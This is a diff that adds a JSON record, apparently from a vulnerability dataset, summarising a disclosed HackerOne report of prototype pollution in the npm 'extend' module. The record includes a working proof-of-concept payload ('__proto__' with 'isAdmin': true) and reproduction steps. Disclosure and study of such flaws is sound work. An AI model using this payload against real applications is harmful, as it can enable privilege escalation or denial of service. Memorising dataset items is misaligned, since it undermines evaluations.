@@ -1,0 +1,38 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "asgerf ",
+    "title": "Prototype pollution attack (extend)",
+    "content": "\nI would like to report prototype pollution in extend\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: extend\nversion: 3.0.1\nnpm page: https://www.npmjs.com/package/extend\nModule Description\nnode-extend is a port of the classic extend() method from jQuery. It behaves as you expect. It is simple, tried and true.\nNote: The github project is called node-extend but the NPM package is just extend\nModule Stats\n7M downloads in the last week\nVulnerability\nVulnerability Description\nThis is a variant of this vulnerability:\nhttps://hackerone.com/reports/310443\nThe extend function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\nCraft an object of form {__proto__: {...}} and send it to extend(true, {}, ...).\nCode 153 Bytes\n1let extend = require('extend');\n2let payload = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\n3extend(true, {}, payload);\n4console.log({}.isAdmin); // true\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nDenial of service, possibly more depending on the application.\nSee https://hackerone.com/reports/310443\n\n",
+    "severity": [
+        9.3,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Uncontrolled Resource Consumption"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1534938480,
+    "report_url": "https://hackerone.com/reports/381185",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install the 'extend' module using npm: `npm install extend`"
+        ],
+        [
+            2,
+            "Run the following code snippet to demonstrate the prototype pollution: `let extend = require('extend'); let payload = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}'); extend(true, {}, payload); console.log({}.isAdmin); // true`"
+        ]
+    ],
+    "vuln_description": "The 'extend' module is vulnerable to prototype pollution, which allows an attacker to inject properties into Object.prototype. This can lead to denial of service or other security issues depending on how the application uses these properties.",
+    "reason": "The vulnerability is straightforward to exploit once the attacker understands the concept of prototype pollution and how the 'extend' function processes objects. The attack does not involve multiple components, complex states, or novel logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "310443"
+}
